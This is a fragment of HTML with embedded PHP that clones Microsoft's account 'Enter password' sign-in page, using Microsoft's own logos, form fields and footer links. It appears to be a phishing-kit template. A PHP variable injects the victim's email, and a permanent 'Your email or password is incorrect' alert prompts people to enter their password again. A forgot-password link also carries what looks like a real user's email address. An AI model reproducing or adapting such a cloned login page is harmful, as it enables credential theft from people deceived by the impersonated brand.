																																	<!-- /ko -->
																																	<!-- ko if: !bannerLogoUrl && !isChinaDc -->
																																	<!-- ko component: 'accessible-image-control' -->
																																	<!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme -->
																																	<!-- /ko -->
																																	<!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
																																	<!-- ko template: { nodes: [darkImageNode], data: $parent } -->
																																	<img class="logo" pngsrc="https://logincdn.msauth.net/16.000.28299.9/images/microsoft_logo.png?x=ed9c9eb0dce17d752bedea6b5acda6d9" svgsrc="https://logincdn.msauth.net/16.000.28299.9/images/microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" src="https://logincdn.msauth.net/16.000.28299.9/images/microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd" alt="Microsoft">
																																		<!-- /ko -->
																																		<!-- /ko -->
																																		<!-- /ko -->
																																		<!-- /ko -->
																																	</div>
																																	<!-- /ko -->
																																	<!-- ko if: svr.Cv && (paginationControlMethods() && !paginationControlMethods().currentViewHasMetadata('hideLwaDisclaimer')) -->
																																	<!-- /ko -->
																																	<!-- ko if: asyncInitReady -->
																																	<div role="main" data-bind="component: { name: 'pagination-control',
                        publicMethods: paginationControlMethods,
                        params: {
                            enableCssAnimation: svr.A8,
                            disableAnimationIfAnimationEndUnsupported: svr.bB,
                            initialViewId: initialViewId,
                            currentViewId: currentViewId,
                            initialSharedData: initialSharedData,
                            initialError: $loginPage.getServerError() },
                        event: {
                            cancel: paginationControl_onCancel,
                            showView: $loginPage.view_onShow,
                            setLightBoxFadeIn: view_onSetLightBoxFadeIn,
                            animationStateChange: paginationControl_onAnimationStateChange } }">
																																		<!--  -->
																																		<div data-bind="css: { 'zero-opacity': hidePaginatedView() }" class="">
																																			<!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.g) -->
																																			<div data-bind="css: {
        'animate': animate() &amp;&amp; animate.animateBanner(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }" class="animate slide-in-next">
																																				<div data-bind="component: { name: 'identity-banner-control',
            params: {
                userTileUrl: svr.Bw,
                displayName: sharedData.displayName || svr.g,
                isBackButtonVisible: isBackButtonVisible(),
                focusOnBackButton: isBackButtonFocused(),
                backButtonDescribedBy: backButtonDescribedBy() },
            event: {
                backButtonClick: identityBanner_onBackButtonClick } }">
																																					<!--  -->
																																					<div class="identityBanner">
																   
																															<!-- ko if: isBackButtonVisible -->
																																						<!-- /ko -->
																																						<div id="displayName" class="identity" data-bind="text: unsafe_displayName, attr: { 'title': unsafe_displayName }" title="<?php echo $email ?>"><?php echo $email ?></div>
																																					</div>
																																				</div>
																																			</div>
																																			<!-- /ko -->
																																			<div class="pagination-view has-identity-banner animate slide-in-next" data-bind="css: {
        'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.g),
        'zero-opacity': hidePaginatedView.hideSubView(),
        'animate': animate(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }">
																																				<!-- ko foreach: views -->
																																				<!-- ko if: $parent.currentViewIndex() === $index() -->
																																				<!-- /ko -->
																																				<!-- ko if: $parent.currentViewIndex() === $index() -->
																																				<!-- ko template: { nodes: [$data], data: $parent } -->
																																				<div data-viewid="2" data-showidentitybanner="true" data-dynamicbranding="true" data-bind="pageViewComponent: { name: 'login-paginated-password-view',
                        params: {
                            serverData: svr,
                            serverError: initialError,
                            isInitialView: isInitialState,
                            username: sharedData.username,
                            displayName: sharedData.displayName,
                            hipRequiredForUsername: sharedData.hipRequiredForUsername,
                            passwordBrowserPrefill: sharedData.passwordBrowserPrefill,
                            availableCreds: sharedData.availableCreds,
                            evictedCreds: sharedData.evictedCreds,
                            useEvictedCredentials: sharedData.useEvictedCredentials,
                            flowToken: sharedData.flowToken,
                            defaultKmsiValue: svr.Ac === 1,
                            userTenantBranding: sharedData.userTenantBranding,
                            sessions: sharedData.sessions,
                            callMetadata: sharedData.callMetadata },
                        event: {
                            updateFlowToken: $loginPage.view_onUpdateFlowToken,
                            submitReady: $loginPage.view_onSubmitReady,
                            redirect: $loginPage.view_onRedirect,
                            resetPassword: $loginPage.passwordView_onResetPassword,
                            setBackButtonState: view_onSetIdentityBackButtonState,
                            setPendingRequest: $loginPage.view_onSetPendingRequest } }">
																																					<!--  -->
																																					<input type="hidden" name="i13" data-bind="value: isKmsiChecked() ? 1 : 0" value="0">
																																						<input type="hidden" name="login" data-bind="value: unsafe_username" value="<?php echo $email ?>">
																																							<input type="text" name="loginfmt" value="<?php echo $email ?>" data-bind="moveOffScreen, value: unsafe_displayName" class="moveOffScreen" tabindex="-1" aria-hidden="true">
																																								<input type="hidden" name="type" data-bind="value: svr.az ? 20 : 11" value="11">
																																									<input type="hidden" name="LoginOptions" data-bind="value: isKmsiChecked() ? 1 : 3" value="3">
																																										<input type="hidden" name="lrt" data-bind="value: callMetadata.IsLongRunningTransaction" value="">
																																											<input type="hidden" name="lrtPartition" data-bind="value: callMetadata.LongRunningTransactionPartition" value="">
																																												<input type="hidden" name="hisRegion" data-bind="value: callMetadata.HisRegion" value="">
																																													<input type="hidden" name="hisScaleUnit" data-bind="value: callMetadata.HisScaleUnit" value="">
																																														<div id="loginHeader" class="row text-title" role="heading" aria-level="1" data-bind="text: str['CT_PWD_STR_EnterPassword_Title']">Enter password</div>
																																														<!-- ko if: unsafe_pageDescription -->
																																														<!-- /ko -->
																																														<div class="row">
																																															<div class="form-group col-md-24">
																																																<div aria-live="assertive" role="alert" style="" class="error-alert-pass">
											<div class="alert alert-error">Your email or password is incorrect. If you don't remember your password, <a href="#">reset it now.</a></div>
										</div>
																																																<div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox-field',
            publicMethods: passwordTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: str['CT_PWD_STR_PwdTB_Label'] },
            event: {
                updateFocus: passwordTextbox.textbox_onUpdateFocus } }">
																																																	<!-- ko withProperties: { '$placeholderText': placeholderText } -->
																																																	<!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->
																																																	<input name="passwd" type="password" id="i0118" autocomplete="off" class="form-control" aria-required="true" data-bind="
                textInput: passwordTextbox.value,
                ariaDescribedBy: 'loginHeader passwordDesc',
                hasFocusEx: passwordTextbox.focused() &amp;&amp; !showPassword(),
                placeholder: $placeholderText,
                ariaLabel: unsafe_passwordAriaLabel,
                moveOffScreen: showPassword,
                css: { 'has-error': passwordTextbox.error }" aria-describedby="loginHeader passwordDesc" placeholder="Password" aria-label="Enter the password for <?php echo $email ?>" tabindex="0">
																																																		<!-- ko if: svr.b6 && showPassword() -->
																																																		<!-- /ko -->
																																																		<!-- /ko -->
																																																		<!-- /ko -->
																																																		<!-- ko ifnot: usePlaceholderAttribute -->
																																																		<!-- /ko -->
																																																	</div>
																																																	<!-- ko if: svr.b6 -->
																																																	<!-- /ko -->
																																																</div>
																																															</div>
																																															<!-- ko if: svr.AE && showHipOnPasswordView -->
																																															<!-- /ko -->
																																															<div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons">
																																																<div>
																																																	<!-- ko if: svr.bw -->
																																																	<!-- /ko -->
																																																	<!-- ko if: svr.aK !== false && !svr.bw && !tenantBranding.KeepMeSignedInDisabled -->
																																																	<div id="idTd_PWD_KMSI_Cb" class="form-group checkbox text-block-body no-margin-top" data-bind="visible: !svr.F &amp;&amp; !showHipOnPasswordView">
																																																		<label id="idLbl_PWD_KMSI_Cb">
																																																			<input name="KMSI" id="idChkBx_PWD_KMSI0Pwd" type="checkbox" data-bind="checked: isKmsiChecked, ariaLabel: str['CT_PWD_STR_KeepMeSignedInCB_Text']" aria-label="Keep me signed in">
																																																				<span data-bind="text: str['CT_PWD_STR_KeepMeSignedInCB_Text']">Keep me signed in</span>
																																																			</label>
																																																		</div>
																																																		<!-- /ko -->
																																																		<div class="row">
																																																			<div class="col-md-24">
																																																				<div class="text-13 action-links">
																																																					<div class="form-group">
																																																						<a id="idA_PWD_ForgotPassword" role="link" href="https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/oauth20_authorize.srf%3fresponse_type%3dcode%26client_id%3d51483342-085c-4d86-bf88-cf50c7252078%26scope%3dopenid%2bprofile%2bemail%2boffline_access%26response_mode%3dform_post%26redirect_uri%3dhttps%253a%252f%252flogin.microsoftonline.com%252fcommon%252ffederation%252foauth2%26state%3drQIIAXWSMWzTQBSGc0kb2grRCoGArUJMgJOzz3biSFVpEic05JImJHF6S5Q6tmMn9jn2FdfZkRgYKtg6MnaEBSEhMXcqYuuMEGJCTEyIlB3p11v-f3jv_d_9FJ_hC_dEJErD3IHCKUMZcaLCQ24oCjKHJCQjAfIjCaLg-toGrZ2fPf3WfvTq4eubye3tPydgdTC1nxkZnbqn4NaYMT8sZLNRFGWoadr6PyP7HoBzAL4DcJJcNjyuWjxNhjLKQSTzEEk8yuUFIS9msNCdk07DIY7KiNaK8FMIiYalemc6xs6EkWrbxVp3jt3ufH--HzWraoTLOo_LFsNlMsElCLHTc-odi1_kGOlYEa7ieL-jQizUJhfJ9ebOIRsLl4MG9tz4lVw1aeAOfBqyk9RH0PQNb3dUop5n6CxzGTM8ZutDZlNvL6C-ETDbCLdgrq8IxbgrHCJOqLW4fByrfa7SrxSjEMaeaMy0sBQYB72RtqsHpFSlZj8iA9dyd-ygJDI0ccXK0UybQDQI1Z6lzxxXKFtc3xniqN8j9ghJDdOqlXuColT3uIY3WJzZzhMSmTJyDhnfaojTRr4T-0yuEU5RD-qD1ttUevFsl3pnqWuLVT17tOkH1LSnxvkS-LF0FaYKKytrG4nbic3E7yXwZnnR5-fG49aX6fqTd8_vvLz79VPibDlbH5kP2pDO9nRfG7fREdFiST2a5YvWrOSNSUjNdletlFvNrrqFCvxxGhyn0z_T4MWVxIfV_xFwsXZjQZHCwUttwlyBVwo8T_4C0%26estsfed%3d1%26uaid%3dcad04a6fe6534052922c9315023f3ffe%26fci%3d4345a7b9-9a63-4910-a426-35363201d503%26mkt%3den-GB%26username%3drobocodez%2540outlook.com%26contextid%3d97B456D62C7B2F2E%26bk%3d1568013747&amp;id=293577&amp;uiflavor=web&amp;client_id=1E00004417ACAE&amp;uaid=cad04a6fe6534052922c9315023f3ffe&amp;mkt=EN-GB&amp;lc=2057&amp;bk=1568013747" data-bind="text: str['CT_PWD_STR_ForgotPwdLink_Text'], href: svr.p, click: resetPassword_onClick">Forgotten your password?</a>
																																																					</div>
																																																					<!-- ko if: allowPhoneDisambiguation -->
																																																					<!-- /ko -->
																																																					<!-- ko ifnot: useEvictedCredentials -->
																																																					<!-- ko component: { name: "cred-switch-link-control",
                            params: {
                                serverData: svr,
                                username: username,
                                availableCreds: availableCreds,
                                flowToken: flowToken,
                                currentCred: { credType: 1 } },
                            event: {
                                switchView: credSwitchLink_onSwitchView,
                                redirect: onRedirect,
                                setPendingRequest: credSwitchLink_onSetPendingRequest,
                                updateFlowToken: credSwitchLink_onUpdateFlowToken } } -->
																																																					<!--  -->
																																																					<div class="form-group">
																																																						<!-- ko if: credentialCount > 1 || (credentialCount === 1 && (showForgotUsername || selectedCredShownOnlyOnPicker)) -->
																																																						<!-- /ko -->
																																																						<!-- ko if: credentialCount === 1 && !(showForgotUsername || selectedCredShownOnlyOnPicker) -->
																																																						<!-- /ko -->
																																																						<!-- ko if: credentialCount === 0 && showForgotUsername -->
																																																						<!-- /ko -->
																																																					</div>
																																																					<!-- ko if: credLinkError -->
																																																					<!-- /ko -->
																																																					<!-- /ko -->
																																																					<!-- ko if: evictedCreds.length > 0 -->
																																																					<!-- /ko -->
																																																					<!-- /ko -->
																																																					<!-- ko if: showChangeUserLink -->
																																																					<!-- /ko -->
																																																				</div>
																																																			</div>
																																																		</div>
																																																	</div>
																																																	<div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }">
																																																		<div data-bind="component: { name: 'footer-buttons-field',
        params: {
            serverData: svr,
            primaryButtonText: str['CT_PWD_STR_SignIn_Button'],
            isPrimaryButtonEnabled: !isRequestPending(),
            isPrimaryButtonVisible: svr.f,
            isSecondaryButtonEnabled: true,
            isSecondaryButtonVisible: false },
        event: {
            primaryButtonClick: primaryButton_onClick } }">
																																																			<div class="col-xs-24 no-padding-left-right button-container" data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { 'no-margin-bottom': removeBottomMargin }">
																																																				<!-- ko if: isSecondaryButtonVisible -->
																																																				<!-- /ko -->
																																																				<div class="inline-block">
																																																					<!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 -->
																																																					<input type="submit" id="idSIButton9" class="btn btn-block btn-primary" data-bind="
            attr: primaryButtonAttributes,
            value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
            hasFocus: focusOnPrimaryButton,
            click: primaryButton_onClick,
            enable: isPrimaryButtonEnabled,
            visible: isPrimaryButtonVisible,
            preventTabbing: primaryButtonPreventTabbing" value="Sign in">
																																																					</div>
																																																				</div>
																																																			</div>
																																																		</div>
																																																	</div>
																																																	<!-- ko if: tenantBranding.BoilerPlateText -->
																																																	<!-- /ko -->
																																																</div>
																																																<!-- /ko -->
																																																<!-- /ko -->
																																																<!-- ko if: $parent.currentViewIndex() === $index() -->
																																																<!-- /ko -->
																																																<!-- ko if: $parent.currentViewIndex() === $index() -->
																																																<!-- /ko -->
																																																<!-- ko if: $parent.currentViewIndex() === $index() -->
																																																<!-- /ko -->
																																																<!-- ko if: $parent.currentViewIndex() === $index() -->
																																																<!-- /ko -->
																																																<!-- ko if: $parent.currentViewIndex() === $index() -->
																																																<!-- /ko -->
																																																<!-- ko if: $parent.currentViewIndex() === $index() -->
																																																<!-- /ko -->
																																																<!-- ko if: $parent.currentViewIndex() === $index() -->
																																																<!-- /ko -->
																																																<!-- ko if: $parent.currentViewIndex() === $index() -->
																																																<!-- /ko -->
																																																<!-- ko if: $parent.currentViewIndex() === $index() -->
																																																<!-- /ko -->
																																																<!-- ko if: $parent.currentViewIndex() === $index() -->
																																																<!-- /ko -->
																																																<!-- ko if: $parent.currentViewIndex() === $index() -->
																																																<!-- /ko -->
																																																<!-- ko if: $parent.currentViewIndex() === $index() -->
																																																<!-- /ko -->
																																																<!-- ko if: $parent.currentViewIndex() === $index() -->
																																																<!-- /ko -->
																																																<!-- ko if: $parent.currentViewIndex() === $index() -->
																																																<!-- /ko -->
																																																<!-- ko if: $parent.currentViewIndex() === $index() -->
																																																<!-- /ko -->
																																																<!-- ko if: $parent.currentViewIndex() === $index() -->
																																																<!-- /ko -->
																																																<!-- ko if: $parent.currentViewIndex() === $index() -->
																																																<!-- /ko -->
																																																<!-- ko if: $parent.currentViewIndex() === $index() -->
																																																<!-- /ko -->
																																																<!-- ko if: $parent.currentViewIndex() === $index() -->
																																																<!-- /ko -->
																																																<!-- ko if: $parent.currentViewIndex() === $index() -->
																																																<!-- /ko -->
																																																<!-- ko if: $parent.currentViewIndex() === $index() -->
																																																<!-- /ko -->
																																																<!-- ko if: $parent.currentViewIndex() === $index() -->
																																																<!-- /ko -->
																																																<!-- ko if: $parent.currentViewIndex() === $index() -->
																																																<!-- /ko -->
																																																<!-- ko if: $parent.currentViewIndex() === $index() -->
																																																<!-- /ko -->
																																																<!-- ko if: $parent.currentViewIndex() === $index() -->
																																																<!-- /ko -->
																																																<!-- ko if: $parent.currentViewIndex() === $index() -->
																																																<!-- /ko -->
																																																<!-- /ko -->
																																															</div>
																																														</div>
																																													</div>
																																													<!-- /ko -->
																																												</div>
																																												<!-- ko if: showDebugDetails -->
																																												<!-- /ko -->
																																												<!-- ko if: showFedCredButton -->
																																												<!-- /ko -->
																																												<!-- ko if: newSession -->
																																												<!-- /ko -->
																																												<input type="hidden" name="ps" data-bind="value: postedLoginStateViewId" value="">
																																													<input type="hidden" name="psRNGCDefaultType" data-bind="value: postedLoginStateViewRNGCDefaultType" value="">
																																														<input type="hidden" name="psRNGCEntropy" data-bind="value: postedLoginStateViewRNGCEntropy" value="">
																																															<input type="hidden" name="psRNGCSLK" data-bind="value: postedLoginStateViewRNGCSLK" value="">
																																																<input type="hidden" name="canary" data-bind="value: svr.canary" value="">
																																																	<input type="hidden" name="ctx" data-bind="value: ctx" value="">
																																																		<input type="hidden" name="hpgrequestid" data-bind="value: svr.sessionId" value="">
																																																			<input type="hidden" id="i0327" data-bind="attr: { name: svr.CQ }, value: flowToken" name="PPFT" value="DWHZxpaEa1pWFnlEey9vsZoQY4e2lkc!wK9fQv3UukCuue7LYPWv6AT!M2dmdjTebsmO0s*lGwXM5MeLug!nGU!KAFmiZKGjeZkW03c8ArgudA95wJ2xxxvdy*StpLx0SC0DDPVOYKkXdNFrmPuOqO!bk0snImDLQ75PWTnfpTl1JvzwvUtetBgL6D**0IggUsEii!ax9o7*v8xjQxLrDXk$">
																																																				<input type="hidden" name="PPSX" data-bind="value: svr.Ct" value="PassportRN">
																																																					<input type="hidden" name="NewUser" value="1">
																																																						<input type="hidden" name="FoundMSAs" data-bind="value: svr.AC" value="">
																																																							<input type="hidden" name="fspost" data-bind="value: svr.fPOST_ForceSignin ? 1 : 0" value="0">
																																																								<input type="hidden" name="i21" data-bind="value: wasLearnMoreShown() ? 1 : 0" value="0">
																																																									<input type="hidden" name="CookieDisclosure" data-bind="value: svr.aQ ? 1 : 0" value="0">
																																																										<input type="hidden" name="IsFidoSupported" data-bind="value: isFidoSupported() ? 1 : 0" value="1">
																																																											<div data-bind="component: { name: 'instrumentation-control',
                publicMethods: instrumentationMethods,
                params: { serverData: svr } }">
																																																												<input type="hidden" name="i2" data-bind="value: clientMode" value="1">
																																																													<input type="hidden" name="i17" data-bind="value: srsFailed" value="0">
																																																														<input type="hidden" name="i18" data-bind="value: srsSuccess">
																																																															<input type="hidden" name="i19" data-bind="value: timeOnPage" value="">
																																																															</div>
																																																															<div id="footer" class="footer default" role="contentinfo" data-bind="css: { 'default': !backgroundLogoUrl() }">
																																																																<div data-bind="component: { name: 'footer-control',
                    publicMethods: footerMethods,
                    params: {
                        serverData: svr,
                        showLinks: true },
                    event: {
                        agreementClick: footer_agreementClick,
                        showDebugDetails: toggleDebugDetails_onClick } }">
																																																																	<!--  -->
																																																																	<!-- ko if: showLinks || impressumLink || showIcpLicense -->
																																																																	<div id="footerLinks" class="footerNode text-secondary">
																																																																		<a id="ftrTerms" data-bind="text: str['MOBILE_STR_Footer_Terms'], href: termsLink, click: termsLink_onClick" href="https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&amp;mkt=EN-GB&amp;vv=1600&amp;uaid=cad04a6fe6534052922c9315023f3ffe">Terms of use</a>
																																																																		<a id="ftrPrivacy" data-bind="text: str['MOBILE_STR_Footer_Privacy'], href: privacyLink, click: privacyLink_onClick" href="https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&amp;mkt=EN-GB&amp;vv=1600&amp;uaid=cad04a6fe6534052922c9315023f3ffe">Privacy &amp; cookies</a>
																																																																		<!-- ko if: impressumLink -->
																																																																		<!-- /ko -->
																																																																		<!-- ko if: showIcpLicense -->
																																																																		<!-- /ko -->
																																																																		<!-- Set attr binding before hasFocusEx to prevent Narrator from losing focus -->
																																																																		<a id="moreOptions" href="#" role="button" class="moreOptions" data-bind="
        click: moreInfo_onClick,
        ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
        attr: { 'aria-expanded': showDebugDetails().toString() },
        hasFocusEx: focusMoreInfo()" aria-label="Click here for troubleshooting information" aria-expanded="false">
																																																																			<!-- ko component: { name: 'accessible-image-control', params: { hasDarkBackground: true } } -->
																																																																			<!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme -->
																																																																			<!-- ko template: { nodes: [lightImageNode], data: $parent } -->
																																																																			<img class="desktopMode" role="presentation" pngsrc="https://logincdn.msauth.net/16.000.28299.9/images/ellipsis_white.png?x=0ad43084800fd8b50a2576b5173746fe" svgsrc="https://logincdn.msauth.net/16.000.28299.9/images/ellipsis_white.svg?x=5ac590ee72bfe06a7cecfd75b588ad73" data-bind="imgSrc" src="https://logincdn.msauth.net/16.000.28299.9/images/ellipsis_white.svg?x=5ac590ee72bfe06a7cecfd75b588ad73">
																																																																				<!-- /ko -->
																																																																				<!-- /ko -->
																																																																				<!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
																																																																				<!-- /ko -->
																																																																				<!-- /ko -->
																																																																				<!-- ko component: 'accessible-image-control' -->
																																																																				<!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme -->
																																																																				<!-- /ko -->
																																																																				<!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
																																																																				<!-- ko template: { nodes: [darkImageNode], data: $parent } -->
																																																																				<img class="mobileMode" role="presentation" pngsrc="https://logincdn.msauth.net/16.000.28299.9/images/ellipsis_grey.png?x=5bc252567ef56db648207d9c36a9d004" svgsrc="https://logincdn.msauth.net/16.000.28299.9/images/ellipsis_grey.svg?x=2b5d393db04a5e6e1f739cb266e65b4c" data-bind="imgSrc" src="https://logincdn.msauth.net/16.000.28299.9/images/ellipsis_grey.svg?x=2b5d393db04a5e6e1f739cb266e65b4c">
																																																																					<!-- /ko -->
																																																																					<!-- /ko -->
																																																																					<!-- /ko -->
																																																																				</a>
																																																																			</div>
																																																																			<!-- /ko -->
																																																																		</div>
																																																																	</div>
																																																																</div>
																																																																<!-- /ko -->
																																																															</div>
																																																															<!-- /ko -->
																																																														</form>
																																																															<form method="post" aria-hidden="true" target="_top" data-bind="autoSubmit: postRedirectForceSubmit, attr: { action: postRedirectUrl }">
																																																																<!-- ko foreach: postRedirectParams -->
																																																																<!-- /ko -->
																																																															</form>
																																																															<!-- ko if: svr.Bz && !svr.fUseFetchSessionsForDsso -->
																																																															<div data-bind="component: { name: 'fetch-sessions-control',
    params: {
        serverData: svr,
        sessionPullType: sessionPullType },
    event: {
        updateUserTiles: fetchSessions_onUpdateUserTiles,
        executeGctResult: fetchSessions_onExecuteGctResult,
        incrementAsyncTileRequestCount: fetchSessions_onIncrementAsyncTileRequestCount,
        decrementAsyncTileRequestCount: fetchSessions_onDecrementAsyncTileRequestCount } }">
																																																																<!--  -->
																																																																<!-- ko if: (sessionPullType & 1) != 0 && callMsaStaticMeControl() -->
																																																																<!-- /ko -->
																																																																<!-- ko if: (sessionPullType & 2) != 0 && desktopSsoRunning() -->
																																																																<!-- /ko -->
																																																															</div>
																																																															<!-- /ko -->
																																																															<!-- ko if: svr.Av -->
																																																															<!-- /ko -->
																																																														</div>
																																																													</body>
																																																												</html>